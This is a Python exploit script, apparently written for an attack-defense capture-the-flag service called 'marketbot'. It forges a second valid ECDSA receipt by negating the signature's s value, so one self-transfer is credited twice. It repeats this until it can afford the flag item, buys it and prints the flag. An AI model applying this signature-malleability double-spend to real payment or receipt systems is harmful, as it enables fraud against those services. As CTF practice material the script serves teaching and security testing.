#!/usr/bin/env python3

import sys
import ecdsa
import random
import string

from bot_client import BotClient
from client import Client, User
from protocol import SIGNATURE_SIZE, TransferReceipt


SERVICE_PORT = 10050

BOT_USERNAME = 'marketbot'

USERNAME_LENGTH = 12
PASSWORD_LENGTH = 16


def randstr(length: int) -> str:
    alphabet = string.ascii_letters + string.digits
    return ''.join(random.choices(alphabet, k=length))


def randuser() -> User:
    username = randstr(USERNAME_LENGTH)
    password = randstr(PASSWORD_LENGTH)
    return User(username, password)


def randuser_auth(client: Client) -> User:
    user = randuser()
    client.user = user
    client.register(exist_ok=True)
    client.auth()
    return user


def malleate_receipt(receipt: TransferReceipt):
    r_bs = receipt.signature[:SIGNATURE_SIZE//2]
    s = int.from_bytes(receipt.signature[SIGNATURE_SIZE//2:], 'big')
    s2 = -s % int(ecdsa.curves.NIST256p.order)
    s2_bs = s2.to_bytes(SIGNATURE_SIZE//2, 'big')
    sig = r_bs + s2_bs
    return TransferReceipt(
        receipt.amount, receipt.currency, receipt.recipient_userid, sig)


def exploit(client: Client, flagid: str):
    assert flagid.startswith('item:')
    item_id = int(flagid[len('item:'):])

    randuser_auth(client)

    bot_uid = client.get_userid(BOT_USERNAME)
    bot = BotClient(client, bot_uid)

    seller, price, currency, _ = bot.info(item_id)
    print(f'Flag price: {price}', file=sys.stderr)

    balance = client.get_balance(currency)
    print(f'Balance: {balance}', file=sys.stderr)

    while balance < price:
        receipt_1 = client.transfer(client.user.userid, currency, balance)
        client.receive(receipt_1)

        # BUG: receipt signatures are malleable, exploit it to receive twice
        receipt_2 = malleate_receipt(receipt_1)
        client.receive(receipt_2)

        balance = client.get_balance(currency)
        print(f'Balance: {balance}', file=sys.stderr)

    receipt = client.transfer(seller, currency, price)
    token = bot.buy(item_id, receipt)
    flag = bot.view(token)

    print(flag)


def main():
    if len(sys.argv) != 3:
        print(f'Usage: {sys.argv[0]} <host> <flag ID>', file=sys.stderr)
        exit(1)

    host, flagid = sys.argv[1:]

    client = Client()
    client.connect(host, SERVICE_PORT)

    exploit(client, flagid)


if __name__ == '__main__':
    main()
